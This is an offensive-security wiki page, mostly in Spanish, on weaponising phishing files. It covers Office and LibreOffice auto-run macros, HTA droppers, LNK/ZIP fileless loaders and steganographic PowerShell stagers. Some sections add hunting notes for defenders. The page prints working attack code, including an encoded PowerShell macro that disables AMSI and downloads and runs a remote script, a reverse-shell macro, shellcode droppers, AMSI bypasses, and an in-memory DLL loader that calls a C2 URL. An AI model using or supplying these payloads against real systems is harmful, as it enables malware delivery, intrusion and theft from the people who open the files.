# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza una validación de los datos del archivo antes de abrirlo. La validación de datos se realiza en forma de identificación de la estructura de datos, según el estándar OfficeOpenXML. Si ocurre algún error durante la identificación de la estructura de datos, el archivo que se está analizando no se abrirá.

Normalmente, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible renombrar el archivo cambiando la extensión y aun así conservar su capacidad de ejecutar macros.\
Por ejemplo, un archivo RTF no admite macros, por diseño, pero un archivo DOCM renombrado a RTF será procesado por Microsoft Word y podrá ejecutar macros.\
Las mismas estructuras internas y mecanismos se aplican a todo el software de la suite Microsoft Office (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para comprobar qué extensiones van a ser ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) que incluye macros también pueden “ejecutar” macros.

### External Image Load

Ve a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Autoload functions

Cuanto más comunes sean, más probable es que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **File > Info > Inspect Document > Inspect Document**, lo que abrirá el Document Inspector. Haz clic en **Inspect** y luego en **Remove All** junto a **Document Properties and Personal Information**.

#### Extensión Doc

Cuando termines, selecciona el menú desplegable **Save as type**, cambia el formato de **`.docx`** a **Word 97-2003 `.doc`**.\
Haz esto porque **no puedes guardar macros dentro de un `.docx`** y existe un **estigma** **alrededor** de la extensión **`.docm`** con macros (por ejemplo, el icono en miniatura tiene un enorme `!` y algunos gateways web/email los bloquean por completo). Por lo tanto, esta **extensión heredada `.doc` es el mejor compromiso**.

#### Generadores de macros maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros de autoejecución en LibreOffice ODT (Basic)

Los documentos de LibreOffice Writer pueden incrustar macros Basic y ejecutarlas automáticamente cuando se abre el archivo vinculando la macro al evento **Open Document** (Tools → Customize → Events → Open Document → Macro…). Una macro simple de reverse shell se ve así:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note las comillas dobles (`""`) dentro de la cadena – LibreOffice Basic las usa para escapar comillas literales, así que payloads que terminan con `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Delivery tips:

- Guarda como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar correos con `swaks`, usa `--attach @resume.odt` (el `@` es necesario para que se envíen como adjunto los bytes del archivo, no la cadena del nombre del archivo). Esto es crítico al abusar de servidores SMTP que aceptan destinatarios `RCPT TO` arbitrarios sin validación.

## HTA Files

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación "fully trusted", sin las restricciones del modelo de seguridad del navegador.

Un HTA se ejecuta usando **`mshta.exe`**, que normalmente está **instalado** junto con **Internet Explorer**, lo que hace que **`mshta` dependa de IE**. Así que si se ha desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Hay varias formas de **forzar la autenticación NTLM "remotamente"**, por ejemplo, podrías añadir **imágenes invisibles** a correos electrónicos o HTML que el usuario vaya a acceder (¿incluso HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **desencadenen** una **autenticación** solo por **abrir la carpeta.**

**Consulta estas ideas y más en las siguientes páginas:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Las campañas altamente efectivas entregan un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco es que el PowerShell loader real se almacena dentro de los bytes crudos del ZIP después de un marcador único, y el .lnk lo extrae y lo ejecuta completamente en memoria.

Flujo típico implementado por el one-liner de PowerShell del .lnk:

1) Localizar el ZIP original en rutas comunes: Desktop, Downloads, Documents, %TEMP%, %ProgramData% y el padre del directorio de trabajo actual.
2) Leer los bytes del ZIP y encontrar un marcador codificado (p. ej., xFIQCV). Todo lo que sigue al marcador es el payload de PowerShell incrustado.
3) Copiar el ZIP a %ProgramData%, extraerlo allí y abrir el .docx señuelo para parecer legítimo.
4) Bypassar AMSI para el proceso actual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Desofuscar la siguiente etapa (p. ej., eliminar todos los caracteres #) y ejecutarla en memoria.

Ejemplo de esqueleto de PowerShell para extraer y ejecutar la etapa incrustada:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notas
- La entrega a menudo abusa de subdominios PaaS reputados (p. ej., *.herokuapp.com) y puede restringir los payloads (servir ZIP benignos según IP/UA).
- La siguiente etapa con frecuencia descifra shellcode base64/XOR y lo ejecuta mediante Reflection.Emit + VirtualAlloc para minimizar los artefactos en disco.

Persistencia usada en la misma cadena
- COM TypeLib hijacking del control Microsoft Web Browser para que IE/Explorer o cualquier app que lo incruste relance automáticamente el payload. Ver detalles y comandos listos para usar aquí:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Búsqueda/IOCs
- Archivos ZIP que contienen la cadena marcador ASCII (p. ej., xFIQCV) añadida a los datos del archivo.
- .lnk que enumera carpetas padre/usuario para localizar el ZIP y abre un documento señuelo.
- Manipulación de AMSI vía [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Hilos empresariales de larga duración que terminan con enlaces alojados bajo dominios PaaS de confianza.

## LNK de señuelo primero → persistencia mediante tarea programada → side-loading de CPL de confianza

Otro patrón recurrente es un **`.lnk` que impersona un documento** y que abre inmediatamente un señuelo benigno mientras prepara la cadena real en segundo plano.

Flujo observado:
1. El acceso directo **se hace pasar por un PDF** y usa `conhost.exe` o un proxy similar para lanzar un downloader de PowerShell ofuscado.
2. Los fragmentos de PowerShell trocean tokens obvios (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) para que las detecciones ingenuas que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detecten el comando.
3. El stager descarga primero el **documento señuelo**, lo abre para la víctima y luego reconstruye los archivos maliciosos en segundo plano.
4. Los payloads pueden escribirse con **extensiones basura** y luego renombrarse eliminando caracteres de relleno, retrasando la aparición de artefactos obvios `.exe` / `.cpl`.
5. La persistencia se establece con una **tarea programada basada en minutos** que lanza un binario host de confianza desde una ruta escribible por el usuario.

Pistas mínimas de hunting de este patrón:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Un diseño útil de staging para reconocer es:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Por qué la segunda etapa es sigilosa

En el caso de estudio de Rapid7, la tarea programada lanzaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** estaba staged junto a él y exportaba **`RunFODW`**, el binario confiable de Microsoft cargó lateralmente el CPL del atacante en lugar de la copia legítima del sistema.

Luego el CPL:
- Lee un blob **AES-256-CBC** desde `C:\Windows\Tasks\editor.dat`
- Lo descifra mediante **Windows CNG / `bcrypt.dll`**
- Asigna memoria ejecutable y copia el shellcode descifrado
- Lo ejecuta de forma indirecta pasando el puntero del shellcode como callback para **`EnumUILanguagesW`**

Ese último paso merece hunting por separado: el malware a menudo evita un salto directo `((void(*)())buf)()` y, en su lugar, abusa de una **WinAPI legítima que acepta callbacks** para transferir la ejecución.

El payload descifrado en esta campaña era shellcode de **Donut**, que luego mapeó el PE final completamente en memoria y parchó **AMSI/WLDP/ETW** en el proceso actual antes de entregar la ejecución. Para notas más profundas sobre side-loading y postprocesamiento residente en memoria, consulta:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivotes prácticos de hunting:
- `.lnk` que lanza `powershell.exe` o `conhost.exe` seguido de un documento señuelo visible.
- Descargas breves a **`C:\Users\Public\`** seguidas de renombrados inmediatos desde extensiones sin sentido.
- Tareas programadas con nombres anodinos como `GoogleErrorReport` ejecutándose desde **directorios escribibles por el usuario**.
- Binarios confiables cargando archivos **`.cpl` / `.dll`** desde el mismo directorio no del sistema.
- Blobs de texto Base64 escritos bajo **`C:\Windows\Tasks\`** y luego leídos por el módulo side-loaded.

## Cargas útiles delimitadas por esteganografía en imágenes (stager de PowerShell)

Las cadenas de carga recientes entregan JavaScript/VBS ofuscado que decodifica y ejecuta un stager de PowerShell en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una DLL .NET codificada en Base64 oculta como texto plano entre marcadores únicos de inicio/fin. El script busca estos delimitadores (ejemplos vistos en la práctica: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, decodifica Base64 a bytes, carga el assembly en memoria y llama a un método de entrada conocido con la URL de C2.

Flujo de trabajo
- Stage 1: Dropper JS/VBS archivado → decodifica Base64 incrustado → lanza stager de PowerShell con -nop -w hidden -ep bypass.
- Stage 2: Stager de PowerShell → descarga la imagen, extrae el Base64 delimitado por marcadores, carga la DLL .NET en memoria y llama a su método (p. ej., VAI) pasando la URL de C2 y opciones.
- Stage 3: El loader recupera el payload final y normalmente lo inyecta mediante process hollowing en un binario confiable (comúnmente MSBuild.exe). Mira más sobre process hollowing y trusted utility proxy execution aquí:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ejemplo de PowerShell para extraer una DLL de una imagen y llamar a un método .NET en memoria:

<details>
<summary>Extractor y cargador de payload stego en PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notas
- Esto es ATT&CK T1027.003 (steganography/marker-hiding). Los marcadores varían entre campañas.
- AMSI/ETW bypass y la deofuscación de strings se aplican comúnmente antes de cargar el assembly.
- Hunting: escanea imágenes descargadas en busca de delimitadores conocidos; identifica PowerShell accediendo a imágenes y decodificando inmediatamente blobs Base64.

Ver también herramientas stego y técnicas de carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Una etapa inicial recurrente es un pequeño `.js` o `.vbs` muy ofuscado entregado dentro de un archive. Su único propósito es decodificar una cadena Base64 incrustada y lanzar PowerShell con `-nop -w hidden -ep bypass` para bootstrap the next stage over HTTPS.

Lógica básica (abstract):
- Leer el contenido del propio archivo
- Localizar un blob Base64 entre cadenas basura
- Decodificar a ASCII PowerShell
- Ejecutar con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Pistas de hunting
- Archivos adjuntos JS/VBS archivados que generan `powershell.exe` con `-enc`/`FromBase64String` en la command line.
- `wscript.exe` lanzando `powershell.exe -nop -w hidden` desde rutas temporales de usuario.

## Archivos de Windows para robar hashes NTLM

Consulta la página sobre **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referencias

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
